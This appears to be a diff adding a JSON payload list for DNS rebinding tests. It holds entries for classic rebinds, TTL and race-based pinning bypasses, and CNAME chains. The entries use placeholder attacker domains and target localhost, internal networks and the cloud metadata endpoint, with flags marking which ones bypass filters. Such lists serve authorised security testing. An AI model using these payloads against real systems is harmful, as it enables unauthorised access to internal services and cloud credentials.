@@ -1,0 +1,30 @@
+{
+  "category": "dns_rebinding",
+  "contexts": {
+    "classic_rebind": {
+      "description": "DNS rebinding attacks that flip A records to internal addresses",
+      "payloads": [
+        {"payload": "rebind-127.0.0.1.ATTACKER_DOMAIN", "description": "DNS rebinding domain that alternates between attacker IP and 127.0.0.1 (localhost)", "waf_bypass": false},
+        {"payload": "rebind-169.254.169.254.ATTACKER_DOMAIN", "description": "Rebind to AWS/GCP metadata endpoint 169.254.169.254", "waf_bypass": false},
+        {"payload": "rebind-10.0.0.1.ATTACKER_DOMAIN", "description": "Rebind to internal network 10.0.0.1 for internal service access", "waf_bypass": false},
+        {"payload": "rebind-[::1].ATTACKER_DOMAIN", "description": "Rebind to IPv6 loopback ::1 to bypass IPv4-only SSRF filters", "waf_bypass": true}
+      ]
+    },
+    "time_based": {
+      "description": "Time-of-check vs time-of-use DNS rebinding techniques",
+      "payloads": [
+        {"payload": "{\"domain\": \"ATTACKER_DOMAIN\", \"ttl\": 0, \"records\": [{\"first\": \"ATTACKER_IP\"}, {\"second\": \"127.0.0.1\"}]}", "description": "TTL=0 with alternating A records — first resolution passes validation, second hits internal", "waf_bypass": false},
+        {"payload": "{\"domain\": \"ATTACKER_DOMAIN\", \"strategy\": \"dns_pinning_bypass\", \"phase1_ip\": \"ATTACKER_IP\", \"phase2_ip\": \"INTERNAL_IP\", \"switch_after_ms\": 2000}", "description": "Bypass DNS pinning by switching record after the pin TTL expires but before the request completes", "waf_bypass": false},
+        {"payload": "{\"domain\": \"ATTACKER_DOMAIN\", \"strategy\": \"toctou_race\", \"validation_ip\": \"ATTACKER_IP\", \"request_ip\": \"169.254.169.254\", \"race_window_ms\": 50}", "description": "Race condition between DNS validation check and actual HTTP request", "waf_bypass": false}
+      ]
+    },
+    "cname_chain": {
+      "description": "CNAME-based DNS rebinding to reach internal infrastructure",
+      "payloads": [
+        {"payload": "{\"domain\": \"ATTACKER_DOMAIN\", \"cname\": \"internal-db.corp.local\"}", "description": "CNAME pointing to internal hostname — resolves to internal IP via corporate DNS", "waf_bypass": false},
+        {"payload": "{\"chain\": [\"hop1.ATTACKER_DOMAIN -> hop2.ATTACKER_DOMAIN\", \"hop2.ATTACKER_DOMAIN -> hop3.ATTACKER_DOMAIN\", \"hop3.ATTACKER_DOMAIN -> 169.254.169.254\"]}", "description": "Multi-hop CNAME chain to evade single-hop CNAME resolution checks", "waf_bypass": false},
+        {"payload": "{\"domain\": \"*.internal.ATTACKER_DOMAIN\", \"cname\": \"*.corp.internal\", \"type\": \"wildcard\"}", "description": "Wildcard CNAME that maps any subdomain query to internal infrastructure", "waf_bypass": false}
+      ]
+    }
+  }
+}
